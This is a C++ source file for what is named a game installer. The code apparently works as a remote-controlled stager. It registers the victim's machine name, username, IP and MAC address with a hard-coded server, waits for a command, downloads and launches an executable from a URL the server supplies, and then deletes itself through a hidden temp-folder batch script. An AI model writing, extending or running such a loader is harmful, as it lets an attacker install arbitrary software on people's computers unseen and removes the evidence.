// TorGames.Installer - Entry point
// Downloads and installs the client, then removes itself

#include "common.h"
#include "protocol.h"
#include "downloader.h"
#include "utils.h"
#include "logger.h"

// Global state
static Protocol g_protocol;
static std::string g_clientId;
static DWORD g_startTime;
static bool g_running = true;

// Generate client ID from hardware
std::string GenerateClientId() {
    return Utils::GetHardwareId();
}

// Check if client is already installed
bool IsClientInstalled() {
    std::string installPath = Downloader::GetInstallPath();
    return Utils::FileExists(installPath.c_str());
}

// Launch the installed client
bool LaunchClient(const std::string& path) {
    LOG_INFO("Launching client: %s", path.c_str());

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (CreateProcessA(path.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        LOG_INFO("Client launched successfully (PID: %lu)", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }

    LOG_ERROR("Failed to launch client: %lu", GetLastError());
    return false;
}

// Create self-delete batch script and run it
void SelfDelete() {
    std::string currentPath = Downloader::GetCurrentExePath();

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char batchPath[MAX_PATH];
    snprintf(batchPath, sizeof(batchPath), "%sTorGames_Cleanup.bat", tempPath);

    LOG_INFO("Creating cleanup script: %s", batchPath);

    FILE* f = fopen(batchPath, "w");
    if (f) {
        fprintf(f,
            "@echo off\n"
            "ping 127.0.0.1 -n 3 > nul\n"
            "del /F /Q \"%s\" 2>nul\n"
            "del \"%%~f0\"\n",
            currentPath.c_str());
        fclose(f);

        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        char cmd[MAX_PATH];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", batchPath);

        if (CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            LOG_INFO("Cleanup script launched");
        }
    }
}

// Handle download command from server
bool HandleDownloadCommand(const std::string& url) {
    if (url.empty()) {
        LOG_ERROR("No URL provided");
        return false;
    }

    std::string installPath = Downloader::GetInstallPath();
    LOG_INFO("Installing client to: %s", installPath.c_str());

    // Download the client
    if (!Downloader::DownloadFile(url.c_str(), installPath.c_str())) {
        LOG_ERROR("Download failed");
        return false;
    }

    // Verify download
    if (!Utils::FileExists(installPath.c_str())) {
        LOG_ERROR("Downloaded file not found");
        return false;
    }

    LOG_INFO("Download complete, launching client...");

    // Launch the installed client
    if (!LaunchClient(installPath)) {
        LOG_ERROR("Failed to launch client");
        return false;
    }

    return true;
}

// Process incoming server messages
void ProcessMessage(const ServerMessage& msg) {
    if (msg.type == "accepted") {
        LOG_INFO("Registration accepted");
        return;
    }

    if (msg.type == "command") {
        LOG_INFO("Received command: %s (id=%s)", msg.commandType.c_str(), msg.commandId.c_str());

        // Only handle download command for installer
        if (msg.commandType == "download" || msg.commandType == "6") {
            // URL can be in commandText directly or as JSON
            std::string url = msg.commandText;

            // Check if it looks like a URL
            if (url.find("http") != 0) {
                // Try to parse as JSON
                url = Utils::JsonGetString(msg.commandText.c_str(), "url");
            }

            bool success = HandleDownloadCommand(url);

            // Send response
            g_protocol.SendCommandResponse(msg.commandId.c_str(), success,
                success ? "Install complete" : "Install failed");

            if (success) {
                LOG_INFO("Installation successful, exiting...");
                g_running = false;
            }
        }
        else if (msg.commandType == "ping" || msg.commandType == "1") {
            g_protocol.SendCommandResponse(msg.commandId.c_str(), true, "pong");
        }
        else {
            // Ignore other commands for installer
            LOG_INFO("Ignoring command type: %s (installer only handles download)", msg.commandType.c_str());
            g_protocol.SendCommandResponse(msg.commandId.c_str(), false,
                "Installer only handles download commands");
        }
    }
}

// Main run loop
void Run() {
    DWORD lastHeartbeat = 0;

    while (g_running) {
        // Connect if not connected
        if (!g_protocol.IsConnected()) {
            if (!g_protocol.Connect(DEFAULT_SERVER, DEFAULT_PORT)) {
                LOG_INFO("Reconnecting in %d ms...", RECONNECT_DELAY);
                Sleep(RECONNECT_DELAY);
                continue;
            }

            // Send registration
            g_protocol.SendRegistration(
                g_clientId.c_str(),
                Utils::GetMachineName().c_str(),
                Utils::GetOsVersion().c_str(),
                Utils::GetArchitecture().c_str(),
                Utils::GetCpuCount(),
                Utils::GetTotalMemory(),
                Utils::GetUsername().c_str(),
                INSTALLER_VERSION,
                Utils::GetLocalIp().c_str(),
                Utils::GetMacAddress().c_str());
        }

        // Send heartbeat periodically
        DWORD now = GetTickCount();
        if (now - lastHeartbeat >= HEARTBEAT_INTERVAL) {
            long long uptime = (now - g_startTime) / 1000;
            g_protocol.SendHeartbeat(uptime, Utils::GetAvailableMemory());
            lastHeartbeat = now;
        }

        // Receive and process messages
        ServerMessage msg;
        if (g_protocol.ReceiveMessage(msg, 1000)) {
            ProcessMessage(msg);
        }
    }
}

// Console control handler
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_CLOSE_EVENT) {
        LOG_INFO("Received shutdown signal");
        g_running = false;
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char* argv[]) {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    g_startTime = GetTickCount();
    g_clientId = GenerateClientId();

    LOG_INFO("TorGames.Installer v%s starting...", INSTALLER_VERSION);
    LOG_INFO("Hardware ID: %s", g_clientId.c_str());

    // Check if client is already installed
    if (IsClientInstalled()) {
        std::string installPath = Downloader::GetInstallPath();
        LOG_INFO("Client already installed at: %s", installPath.c_str());

        // Launch existing client
        if (LaunchClient(installPath)) {
            LOG_INFO("Launched existing client, cleaning up installer...");
            SelfDelete();
            CoUninitialize();
            return 0;
        }
    }

    LOG_INFO("Client not installed, connecting to server...");

    // Run main loop - wait for download command from server
    Run();

    // Cleanup - delete ourselves after successful install
    LOG_INFO("Installer complete, cleaning up...");
    SelfDelete();

    CoUninitialize();
    return 0;
}

// Windows subsystem entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    return main(__argc, __argv);
}
